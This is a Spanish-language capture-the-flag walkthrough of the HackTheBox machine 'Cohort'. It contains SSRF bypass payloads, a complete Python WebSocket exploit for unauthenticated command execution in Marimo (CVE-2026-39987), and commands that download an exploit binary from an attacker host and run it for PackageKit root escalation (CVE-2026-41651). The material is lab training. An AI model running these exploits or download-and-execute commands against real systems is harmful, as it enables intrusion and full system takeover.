Write-up: Cohort (HackTheBox)

Dificultad: Moderada / Difícil (según evaluación) | Plataforma: HackTheBox

Objetivos: Explotación de SSRF, Bypass de restricciones de red, Explotación de WebSockets (CVE-2026-39987) y Escalada de privilegios local mediante PackageKit (CVE-2026-41651 - Pack2TheRoot).

1. Reconocimiento y Enumeración Inicial

Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos en la máquina objetivo (10.129.119.9): 

nmap -v -p- --open -T4 -sS -n -oX escaneo.xml 10.129.119.9

El escaneo revela los siguientes puertos abiertos:

  • 22/tcp - SSH
  • 80/tcp - HTTP
  • 443/tcp - HTTPS

Posteriormente, ejecutamos un escaneo exhaustivo de scripts de enumeración y detección de versiones sobre los puertos abiertos: 

nmap -sV -sC -p22,80,443 10.129.119.9

Dado que el servicio web responde bajo un dominio virtual, añadimos la resolución estática al archivo /etc/hosts: 

echo "10.129.119.9 cohort.htb" | sudo tee -a /etc/hosts

2. Enumeración Web y Hallazgo de SSRF

Al interactuar con la aplicación web e interceptar el tráfico en la pestaña de red, se observa el envío de una URL de prueba a través de un formulario con la siguiente estructura de solicitud: 

POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Type: application/json

{ "url": "http://test.com/log.csv", "format": "csv" }

El endpoint procesa un cuerpo JSON con los parámetros url y format, realizando peticiones desde el lado del servidor hacia el recurso especificado.

Análisis del mecanismo de filtrado

Se identifica un filtro que rechaza explícitamente direcciones locales o de bucle invertido devolviendo un mensaje de error ("no permitido"). Este comportamiento denota una validación basada en listas de bloqueo (blacklist) de cadenas literales (como 127.0.0.1 o localhost) en lugar de una resolución y validación robusta de IPs. Esto permite evadir el filtro utilizando representaciones alternativas de la interfaz loopback.

Probamos el primer vector de evasión mediante curl:

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/", "format": "csv"}'

Respuesta obtenida:

{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": " ... Cohort Analytics ...", "message": "Source reachable."}

La validación es exitosa, confirmando la existencia de una vulnerabilidad de Server-Side Request Forgery (SSRF).

3. Explotación de SSRF y Descubrimiento de Servicios Internos

Una vez confirmado el SSRF, procedemos a enumerar servicios internos expuestos localmente.

Exploración del puerto 5000

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1:5000/", "format": "csv"}'

Respuesta:

{ "ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{ \"ok\": false, \"message\": \"Método no permitido.\" }", "message": "La fuente respondió con un estado de error." }

El puerto 5000 corresponde al backend de la propia API, el cual rechaza peticiones mediante métodos no soportados (como GET directo).

Exploración del puerto 8888

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1:8888/", "format": "csv"}'

Respuesta: La aplicación responde con un título que apunta a Marimo (<title>marimo</title>), un entorno de cuadernos interactivos en Python (Python notebooks), protegido por un panel de autenticación que requiere un token de acceso o contraseña.

Fuzzing y Exposición de Configuración de Nginx (/status)

Revisando los directorios del sitio principal, se detecta que la ruta /status devuelve un código de estado 403 Forbidden, lo cual suele denotar restricciones de control de acceso (ACL) de Nginx. Mediante el SSRF consultamos dicho recurso: 

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/status", "format": "csv"}'

Respuesta estructurada (JSON):

{ 
  "service": "cohort-edge", 
  "status": "ok", 
  "generated_by": "nginx", 
  "upstreams": [ 
    { "name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort" }, 
    { "name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000" }, 
    { "name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "espacio de trabajo interno para analistas, no para uso externo" } 
  ] 
}

La respuesta revela un Virtual Host interno oculto: nb-1be3782a8afd3ad5.cohort.htb, el cual actúa como proxy inverso hacia la instancia de Marimo en el puerto 8888. Añadimos este subdominio a nuestro /etc/hosts: 

echo "10.129.119.9 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts

4. Explotación de Marimo (CVE-2026-39987)

Al acceder al subdominio descubierto, nos encontramos con la interfaz de inicio de sesión de Marimo. Investigando sobre vulnerabilidades en este software, identificamos el CVE-2026-39987, una falla de omisión de autenticación previa (pre-authentication bypass) donde la función validate_auth() omite los controles de acceso requeridos específicamente en el endpoint de WebSockets (/terminal/ws), permitiendo a cualquier cliente interactuar directamente con la consola sin credenciales válidas tras completar el protocolo de enlace (handshake).

Script de Explotación de WebSocket

Desarrollamos el siguiente script en Python para interactuar con el WebSocket y ejecutar comandos en el sistema: 

import socket, ssl, base64, os, struct, time, select 

TARGET_IP = "10.129.119.9" 
HOST = "nb-1be3782a8afd3ad5.cohort.htb" 
PATH = "/terminal/ws"

def connect(): 
    raw = socket.create_connection((TARGET_IP, 443), timeout=5) 
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) 
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST) 
    key = base64.b64encode(os.urandom(16)).decode() 
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n") 
    s.sendall(req.encode()) 
    s.settimeout(5) 
    resp = b"" 
    while b"\r\n\r\n" not in resp: 
        resp += s.recv(4096) 
    print("[+] Handshake response:") 
    print(resp.decode(errors="replace")) 
    return s 

def send_text(s, text): 
    payload = text.encode() 
    mask = os.urandom(4) 
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload)) 
    length = len(payload) 
    if length <= 125: 
        header = struct.pack("!BB", 0x81, 0x80 | length) 
    elif length <= 65535: 
        header = struct.pack("!BBH", 0x81, 0x80 | 126, length) 
    else: 
        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length) 
    s.sendall(header + mask + masked) 

def recv_frames(s, duration=3): 
    end = time.time() + duration 
    buf = b"" 
    out = b"" 
    while time.time() < end: 
        r, _, _ = select.select([s], [], [], 0.5) 
        if r: 
            try: 
                chunk = s.recv(4096) 
            except (socket.timeout, ssl.SSLWantReadError): 
                continue 
            if not chunk: 
                break
            buf += chunk 
    while len(buf) >= 2: 
        b1 = buf[1] 
        masked = b1 & 0x80
        plen = b1 & 0x7F
        idx = 2 
        if plen == 126: 
            if len(buf) < 4: break
            plen = struct.unpack("!H", buf[2:4])[0]; idx = 4
        elif plen == 127: 
            if len(buf) < 10: break
            plen = struct.unpack("!Q", buf[2:10])[0]; idx = 10 
        if masked: 
            if len(buf) < idx + 4: break
            mask_key = buf[idx:idx + 4]; idx += 4 
        else: 
            mask_key = None 
        if len(buf) < idx + plen: break
        payload = buf[idx:idx + plen] 
        if mask_key: 
            payload = bytes(c ^ mask_key[i % 4] for i, c in enumerate(payload)) 
        out += payload 
        buf = buf[idx + plen:] 
    return out 

if __name__ == "__main__": 
    import sys 
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
    s = connect() 
    print(recv_frames(s, 3).decode(errors="replace")) 
    send_text(s, cmd + "\r") 
    print(recv_frames(s, 4).decode(errors="replace"))

Ejecutamos el script para verificar el acceso y leer la flag de usuario (user.txt): 

python3 marimo_exploit.py "cat /home/marimo/user.txt"

5. Escalada de Privilegios: Pack2TheRoot (CVE-2026-41651)

Una vez dentro del sistema con privilegios del usuario marimo, realizamos las tareas habituales de reconocimiento post-explotación. El comando sudo -l requiere una contraseña que no poseemos, y la revisión de binarios SUID o tareas cron no arroja vectores inmediatos. Sin embargo, al auditar los paquetes instalados en el sistema mediante el gestor de paquetes, observamos lo siguiente: 

python3 marimo_exploit.py "dpkg -l | grep -i packagekit; which dpkg-deb; dbus-send --version"

Las versiones de PackageKit comprendidas entre la 1.0.2 y la 1.3.4 son vulnerables a CVE-2026-41651, conocida popularmente como "Pack2TheRoot".

Metodología de Explotación:

Transferencia del binario del exploit: En nuestra máquina de atacante, levantamos un servidor temporal HTTP: 

python3 -m http.server 8080

Transferimos el binario compilado al directorio temporal de la víctima:

python3 marimo_exploit.py "curl -s -o /tmp/exploit.bin http://<IP_ATACANTE>:8080/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin"

Ejecución en segundo plano (Race Condition): Debido a que la explotación requiere un tiempo de ejecución superior al de una simple solicitud síncrona para manipular la condición de carrera (race condition), ejecutamos el exploit en segundo plano redirigiendo la salida: 

python3 marimo_exploit.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo iniciado"

Verificación y obtención de privilegios de Superusuario: Tras unos segundos de espera, comprobamos los logs y la generación de la shell SUID resultante: 

python3 marimo_exploit.py "cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1"

Una vez completado el proceso con éxito, procedemos a invocar la bash con privilegios de root para leer la flag definitiva (root.txt). ¡Sistema comprometido por completo!
